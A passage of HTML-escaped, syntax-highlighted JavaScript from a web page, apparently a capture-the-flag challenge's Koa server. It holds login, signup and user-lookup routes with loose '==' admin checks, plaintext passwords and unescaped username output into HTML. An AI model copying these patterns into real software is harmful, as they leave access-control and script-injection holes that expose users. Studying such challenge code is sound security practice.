operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;403&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;you are not admin&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; user &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; User&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;findAll&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token literal-property property&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;password&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!==&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;200&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;user/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;id&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;404&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;login failed&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;router&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/signup&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;ctx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;403&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;you are not admin&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; u &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; User&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;注册成功&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;router&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/user/:id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;ctx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;params&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;403&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;非管理员无权查看&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; user &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; User&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;findAll&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token literal-property property&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token literal-property property&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;id&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user&lt;span class=&#34;token operator&#34;&gt;!==&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;h3&gt;Hello &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;/h3&gt; your name is: &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token 